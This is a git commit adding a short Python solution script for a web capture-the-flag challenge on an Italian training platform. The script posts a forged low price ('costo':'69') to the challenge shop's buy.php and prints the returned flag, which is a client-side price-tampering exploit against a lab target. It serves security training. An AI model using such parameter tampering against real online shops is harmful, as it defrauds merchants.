1f48d775f9cfd91442c6bc97ea22f98b7e7282d1
lore6e7a6f <142683062+lore6e7a6f@users.noreply.github.com>
2025-10-27 21:53:52 +0100

    Implement flag purchase in FlagsShop.py
    Add functionality to buy a flag from the shop.

--- solves/web/FlagsShop.py
+++ solves/web/FlagsShop.py
@@ -1,1 +1,11 @@
-# editare 'value':1000 -> 1 e comprare la flag
+import requests
+
+url = 'http://shops.challs.olicyber.it/buy.php'
+payload = {"id":"2", "costo":"69"}
+
+r = requests.post(url, data=payload).text
+
+for i in r.split():
+    if "flag{" in i.lower():
+        print(i)
+        
